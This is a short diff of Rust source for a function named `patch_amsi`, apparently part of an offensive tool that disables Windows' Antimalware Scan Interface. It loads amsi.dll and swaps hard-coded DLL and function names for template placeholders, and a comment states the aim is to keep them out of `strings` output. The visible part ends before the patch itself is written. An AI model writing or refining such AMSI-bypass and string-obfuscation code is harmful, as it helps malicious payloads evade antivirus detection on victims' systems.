@@ -30,9 +30,9 @@ pub enum PatchAmsiError {
 /// `Params::render_fragment` with code that rebuilds them at runtime, so they
 /// do not appear in `strings`.
 pub fn patch_amsi() -> Result<(), PatchAmsiError> {
-    let amsi_dll = std::ffi::CString::new(AMSI_DLL_DEF).map_err(|_| PatchAmsiError::LoadFailed)?;
+    let amsi_dll = std::ffi::CString::new($AMSI_DLL_DEF$).map_err(|_| PatchAmsiError::LoadFailed)?;
     let func_name =
-        std::ffi::CString::new(AMSI_FUNC_DEF).map_err(|_| PatchAmsiError::LoadFailed)?;
+        std::ffi::CString::new($AMSI_FUNC_DEF$).map_err(|_| PatchAmsiError::LoadFailed)?;
 
     // 1. Load amsi.dll (a no-op if it is already loaded).
     let module = unsafe { LoadLibraryA(PCSTR(amsi_dll.as_ptr() as *const u8)) }
